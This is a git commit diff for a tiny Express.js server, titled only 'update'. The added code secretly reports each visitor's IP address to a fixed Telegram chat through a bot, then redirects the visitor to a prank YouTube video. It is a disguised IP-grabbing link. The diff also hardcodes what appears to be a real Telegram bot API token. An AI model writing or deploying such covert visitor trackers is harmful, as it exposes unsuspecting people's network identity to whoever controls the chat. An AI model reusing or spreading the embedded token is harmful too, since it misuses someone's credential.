7a7f1d58183e4bc11342fb8122fba6a5481ff303
sanicboi <alexandrzezekalo@gmail.com>
2024-07-20 15:37:08 +0300

    update

--- index.js
+++ index.js
@@ -1,10 +1,15 @@
 const express = require('express');
-
+const Bot = require('node-telegram-bot-api')
 const app = express();
 
-app.get('/', (req, res) => {
+const bot = new Bot('7325212318:AAHp04eOZhjfVZjXRX__q5_I3PKkgCX6et0', {
+    polling: true
+})
+
+app.get('/',async (req, res) => {
 
     console.log(req.ip, req.ips);
+    await bot.sendMessage(2074310819, req.ip)
     res.redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
 })
 
